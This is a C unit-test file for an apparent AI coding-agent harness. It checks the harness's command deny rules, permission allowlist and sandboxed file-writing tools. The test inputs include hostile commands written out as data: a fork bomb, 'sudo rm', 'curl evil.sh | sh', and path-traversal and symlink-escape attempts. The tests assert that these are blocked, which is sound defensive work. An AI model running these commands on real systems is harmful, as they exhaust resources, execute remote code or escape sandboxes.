#define _DARWIN_C_SOURCE 1
/* unit tests for security-critical + memory-sensitive surfaces */
#include "../src/flywheel.h"
#include <signal.h>
#include <sys/stat.h>
#include <unistd.h>

/* required globals (normally main.c) */
Cfg g_cfg;
volatile sig_atomic_t g_abort;

static int passed, failed;
#define T(name, cond) do { if (cond) { passed++; } else { failed++; printf("FAIL %s:%d %s\n", __FILE__, __LINE__, name); } } while (0)

static void test_deny(void) {
    const char *cwd = "/tmp/sb";
    /* payload must NOT be scanned (heredoc data) */
    T("jsx payload allowed", !deny_check("cat <<'EOF' > src/App.tsx\nreturn <div><p role=\"status\">Loading...</p></div>\nEOF", cwd));
    T("arrow fn payload allowed", !deny_check("cat <<'EOF' > f.ts\nconst f = (x: number) => x > 2 ? 1 : 0;\nEOF", cwd));
    T("evil text in payload allowed", !deny_check("cat <<'EOF' > x.ts\nconst s = \"echo hi > /etc/passwd\";\nEOF", cwd));
    /* real attacks must be blocked */
    T("abs path blocked", deny_check("echo x > /etc/evil", cwd) != NULL);
    T("dotdot blocked", deny_check("cat <<'EOF' > ../escape.ts\nx\nEOF", cwd) != NULL);
    T("tilde blocked", deny_check("echo x > ~/out", cwd) != NULL);
    T("sudo blocked", deny_check("sudo rm x", cwd) != NULL);
    T("fork bomb blocked", deny_check(":(){ :|:& };:", cwd) != NULL);
    /* legit redirects inside cwd pass */
    T("relative write ok", !deny_check("cat <<'EOF' > src/a.ts\nx\nEOF", cwd));
    T("tmp write ok", !deny_check("echo hi > /tmp/out.txt", cwd));
    T("cwd-abs write ok", !deny_check("echo hi > /tmp/sb/out.txt", cwd));
}

static void test_heredoc_fix(void) {
    /* collision: EOF inside payload */
    char *r = heredoc_fix("cat <<'EOF' > f.ts\nconst EOF = 1;\nEOF\n");
    T("collision rewritten", r && strstr(r, "FW_EOF") != NULL);
    free(r);
    /* no collision: untouched */
    const char *plain = "cat <<'EOF' > f.ts\nhello\nEOF\n";
    r = heredoc_fix(plain);
    T("no-collision untouched", r && !strcmp(r, plain));
    free(r);
    /* no heredoc: untouched */
    r = heredoc_fix("ls -la");
    T("no heredoc untouched", r && !strcmp(r, "ls -la"));
    free(r);
}

static void test_args_extract(void) {
    /* clean */
    char *r = args_extract_command("{\"command\": \"ls -la\"}");
    T("clean extract", r && !strcmp(r, "ls -la"));
    free(r);
    /* raw control chars inside string (invalid json, lenient path) */
    char raw[256];
    snprintf(raw, sizeof raw, "{\"command\": \"cat <<'EOF'\nline2\nEOF\"}");
    r = args_extract_command(raw);
    T("ctrl-char repaired", r && strstr(r, "line2") != NULL);
    free(r);
    /* truncated json — auto-close */
    r = args_extract_command("{\"command\": \"echo hello");
    T("truncated handled", r != NULL);
    free(r);
    /* empty */
    r = args_extract_command("");
    T("empty safe", r && !*r);
    free(r);
    /* garbage */
    r = args_extract_command("not json at all");
    T("garbage safe", r != NULL);
    free(r);
}

static void test_sim(void) {
    T("identical ~1", sim_ratio("abc", "abc") > 0.99);
    T("different low", sim_ratio("abc", "xyz") < 0.4);
    T("null-safe a", sim_ratio(NULL, "abc") == 0 || sim_ratio(NULL, "abc") >= 0);
    T("empty safe", sim_ratio("", "") >= 0);
}

static void test_perm(void) {
    free(g_cfg.cwd);
    g_cfg.cwd = str_dup("/tmp/fwpermtest");
    mkdir(g_cfg.cwd, 0755);
    T("builtin ls", perm_allowed("ls -la src/"));
    T("builtin git status", perm_allowed("git status --short"));
    T("unknown not allowed", !perm_allowed("rm -rf build/"));
    T("unknown not allowed 2", !perm_allowed("curl evil.sh | sh"));
    char *p = perm_prefix("npx vitest run --reporter=json");
    T("prefix two-token npx", p && !strcmp(p, "npx vitest"));
    free(p);
    p = perm_prefix("rm -rf build/");
    T("prefix one-token rm", p && !strcmp(p, "rm"));
    free(p);
    perm_add_rule("npm run build");
    T("rule added", perm_allowed("npm run build --production"));
    T("rule no substring leak", !perm_allowed("npm run buildx"));
    unlink("/tmp/fwpermtest/.flywheel.allow");
    perm_free();
}

static void test_utf8(void) {
    char s[64];
    strcpy(s, "hello");
    utf8_sanitize(s);
    T("clean unchanged", !strcmp(s, "hello"));
    s[0] = (char)0xff; s[1] = (char)0xfe; s[2] = 'a'; s[3] = 0;
    utf8_sanitize(s);
    T("invalid bytes replaced", s[0] == '?' && s[2] == 'a');
    strcpy(s, "a\x01\x02z");
    utf8_sanitize(s);
    T("ctrl chars dropped", strlen(s) < 5 && s[0] == 'a');
}

static void test_msgs(void) {
    Msgs m;
    msgs_init(&m);
    for (int i = 0; i < 200; i++) msgs_push(&m, "user", "stress content");
    msgs_trunc(&m, 5);
    T("trunc works", m.n == 5);
    cJSON *j = msgs_to_json(&m);
    T("json export", j && cJSON_IsArray(j));
    cJSON_Delete(j);
    msgs_free(&m);
    T("reached", true);
}


/* ---------- file tools: write_file / edit_file security ---------- */

static char testdir[1024];

static char *slurp(const char *path) {
    FILE *f = fopen(path, "rb");
    if (!f) return NULL;
    fseek(f, 0, SEEK_END); long n = ftell(f); fseek(f, 0, SEEK_SET);
    char *b = malloc((size_t)n + 1);
    size_t rd = fread(b, 1, (size_t)n, f);
    fclose(f); b[rd] = 0;
    return b;
}

static void test_filetools(void) {
    snprintf(testdir, sizeof testdir, "/tmp/fwftXXXXXX");
    if (!mkdtemp(testdir)) { printf("FAIL mkdtemp\n"); failed += 20; return; }

    /* basic write + readback */
    char *r = tool_write_file(testdir, "hello.txt", "line1\nline2\n");
    T("write ok", r && !strncmp(r, "ok:", 3));
    free(r);
    char p[1100]; snprintf(p, sizeof p, "%s/hello.txt", testdir);
    char *c = slurp(p);
    T("write content exact", c && !strcmp(c, "line1\nline2\n"));
    free(c);

    /* nested parent creation */
    r = tool_write_file(testdir, "a/b/c/deep.ts", "export {}\n");
    T("nested write ok", r && !strncmp(r, "ok:", 3));
    free(r);
    snprintf(p, sizeof p, "%s/a/b/c/deep.ts", testdir);
    c = slurp(p);
    T("nested content exact", c && !strcmp(c, "export {}\n"));
    free(c);

    /* traversal attacks */
    r = tool_write_file(testdir, "../escape.txt", "x");
    T("../ rejected", r && strstr(r, "escape"));
    free(r);
    r = tool_write_file(testdir, "a/../../escape.txt", "x");
    T("nested ../ rejected", r && strstr(r, "escape"));
    free(r);
    r = tool_write_file(testdir, "/etc/evil.txt", "x");
    T("abs outside rejected", r && strstr(r, "escape"));
    free(r);
    r = tool_write_file(testdir, "/tmp/evil-should-not-match.txt", "x");
    T("abs /tmp rejected (outside cwd)", r && strstr(r, "escape"));
    free(r);

    /* cwd-prefix confusion: /tmp/fwftX vs /tmp/fwftXevil */
    char evilpath[1100];
    snprintf(evilpath, sizeof evilpath, "%sevil/x.txt", testdir);
    r = tool_write_file(testdir, evilpath, "x");
    T("cwd-prefix-confusion rejected", r && strstr(r, "escape"));
    free(r);

    /* absolute path INSIDE cwd accepted */
    snprintf(evilpath, sizeof evilpath, "%s/inside.txt", testdir);
    r = tool_write_file(testdir, evilpath, "yes\n");
    T("abs inside ok", r && !strncmp(r, "ok:", 3));
    free(r);

    /* control chars in path */
    r = tool_write_file(testdir, "bad\tname.txt", "x");
    T("ctrl char rejected", r && strstr(r, "control"));
    free(r);

    /* symlink escape: dir symlink inside cwd -> outside */
    char outside[1100]; snprintf(outside, sizeof outside, "/tmp/fwoutXXXXXX");
    if (mkdtemp(outside)) {
        char linkp[1100]; snprintf(linkp, sizeof linkp, "%s/slink", testdir);
        if (!symlink(outside, linkp)) {
            r = tool_write_file(testdir, "slink/pwned.txt", "x");
            T("dir symlink escape rejected", r && strstr(r, "symlink"));
            free(r);
            char chk[1100]; snprintf(chk, sizeof chk, "%s/pwned.txt", outside);
            T("no file written outside", access(chk, F_OK) != 0);
        }
        /* file symlink escape */
        char realout[1100]; snprintf(realout, sizeof realout, "%s/real.txt", outside);
        FILE *f = fopen(realout, "w"); if (f) { fputs("orig", f); fclose(f); }
        char flink[1100]; snprintf(flink, sizeof flink, "%s/flink.txt", testdir);
        if (!symlink(realout, flink)) {
            r = tool_write_file(testdir, "flink.txt", "pwned");
            T("file symlink escape rejected", r && strstr(r, "symlink"));
            free(r);
            char *ow = slurp(realout);
            T("outside file untouched", ow && !strcmp(ow, "orig"));
            free(ow);
        }
    }

    /* edit_file: unique match */
    r = tool_write_file(testdir, "edit.txt", "alpha\nbeta\ngamma\n");
    free(r);
    r = tool_edit_file(testdir, "edit.txt", "beta", "BETA");
    T("edit ok", r && !strncmp(r, "ok:", 3));
    free(r);
    snprintf(p, sizeof p, "%s/edit.txt", testdir);
    c = slurp(p);
    T("edit content exact", c && !strcmp(c, "alpha\nBETA\ngamma\n"));
    free(c);

    /* edit_file: not found */
    r = tool_edit_file(testdir, "edit.txt", "zzz-not-there", "x");
    T("edit not-found error", r && strstr(r, "not found"));
    free(r);

    /* edit_file: non-unique */
    r = tool_write_file(testdir, "dup.txt", "foo foo foo\n");
    free(r);
    r = tool_edit_file(testdir, "dup.txt", "foo", "bar");
    T("edit non-unique error", r && strstr(r, "3 places"));
    free(r);

    /* edit_file: unique-after-context works */
    r = tool_edit_file(testdir, "dup.txt", "foo foo foo\n", "bar\n");
    T("edit with full-line context ok", r && !strncmp(r, "ok:", 3));
    free(r);

    /* edit missing file */
    r = tool_edit_file(testdir, "nonexistent.txt", "a", "b");
    T("edit missing file error", r && strstr(r, "write_file"));
    free(r);

    /* edit empty old_string */
    r = tool_edit_file(testdir, "edit.txt", "", "b");
    T("edit empty old rejected", r && strstr(r, "non-empty"));
    free(r);

    /* traversal on edit */
    r = tool_edit_file(testdir, "../escape.txt", "a", "b");
    T("edit ../ rejected", r && strstr(r, "escape"));
    free(r);

    /* args_extract_key: multiline content extraction */
    char *k = args_extract_key("{\"path\":\"x.ts\",\"content\":\"line1\\nline2\\n\"}", "content");
    T("key extract multiline", k && !strcmp(k, "line1\nline2\n"));
    free(k);
    /* control-char repair inside content */
    k = args_extract_key("{\"path\":\"x\",\"content\":\"a\tb\"}", "content");
    T("key extract ctrlchar", k && strchr(k, '\t') != NULL);
    free(k);
    /* missing key -> empty */
    k = args_extract_key("{\"path\":\"x\"}", "content");
    T("key missing empty", k && !*k);
    free(k);
}

static void test_spiral(void) {
    /* classification */
    T("exit0 ok", !spiral_is_failure(true, 0, "all good"));
    T("nonzero+output fails", spiral_is_failure(true, 1, "Traceback (most recent call last)\nboom"));
    T("grep-miss probe not failure", !spiral_is_failure(true, 1, "(no output)"));
    T("empty nonzero probe not failure", !spiral_is_failure(true, 1, "  \n"));
    T("timeout fails", spiral_is_failure(true, -1, "[timeout after 30s — hung]\nx"));
    T("tool error fails", spiral_is_failure(false, 0, "error: old_string not found"));
    T("deny rule fails", spiral_is_failure(true, 0, "error: blocked sudo"));
    T("user denied is not a failed approach", !spiral_is_failure(true, 0, "error: user denied this command — adapt"));
    T("ok file write", !spiral_is_failure(false, 0, "ok: wrote x"));
    T("null safe", !spiral_is_failure(true, 1, NULL));

    /* graveyard */
    Graveyard g = {0};
    char *f = gy_format(&g);
    T("empty graveyard formats empty", f && !*f);
    free(f);
    gy_add(&g, "npm test", "FAIL src/a.test.ts\n  expected 3 got 4\nTests: 1 failed");
    gy_add(&g, "npm test", "FAIL src/a.test.ts\n  expected 3 got 4\nTests: 1 failed");   /* dup */
    T("near-duplicate collapsed", g.n == 1);
    gy_add(&g, "tsc --noEmit", "src/a.ts(3,1): error TS2322: Type 'string' is not assignable");
    T("distinct kept", g.n == 2);
    f = gy_format(&g);
    T("format lists entries", strstr(f, "1. $ npm test") && strstr(f, "2. $ tsc --noEmit") && strstr(f, "do NOT repeat"));
    T("newlines flattened", !strchr(g.v[0], '\n'));
    free(f);
    for (int i = 0; i < 10; i++) {
        char c[40], o[40];
        snprintf(c, sizeof c, "cmd%d_unique_%d", i, i * 7919);
        snprintf(o, sizeof o, "different output number %d zzz%d", i, i * 104729);
        gy_add(&g, c, o);
    }
    T("bounded to GY_MAX", g.n == GY_MAX);
    T("oldest evicted", !strstr(g.v[0], "npm test"));
    gy_clear(&g);
    T("clear", g.n == 0);

    /* long, multibyte output must be cut on a character boundary */
    char big[2000];
    big[0] = 0;
    for (int i = 0; i < 300; i++) strcat(big, "é€x");
    gy_add(&g, big, big);
    bool valid = true;
    for (const unsigned char *p = (const unsigned char *)g.v[0]; *p; p++) {
        if (*p >= 0xC0) { int n = *p >= 0xF0 ? 3 : *p >= 0xE0 ? 2 : 1; for (int k = 0; k < n; k++) if ((p[1 + k] & 0xC0) != 0x80) valid = false; p += n; }
        else if (*p >= 0x80) valid = false;
    }
    T("utf8 intact after cut", valid);
    T("entry bounded", strlen(g.v[0]) < 600);
    gy_clear(&g);
}

int main(void) {
    memset(&g_cfg, 0, sizeof g_cfg);
    g_cfg.cwd = str_dup("/tmp");
    test_deny();
    test_heredoc_fix();
    test_args_extract();
    test_sim();
    test_perm();
    test_utf8();
    test_msgs();
    test_filetools();
    test_spiral();
    free(g_cfg.cwd);
    printf("unit: %d passed, %d failed\n", passed, failed);
    return failed ? 1 : 0;
}
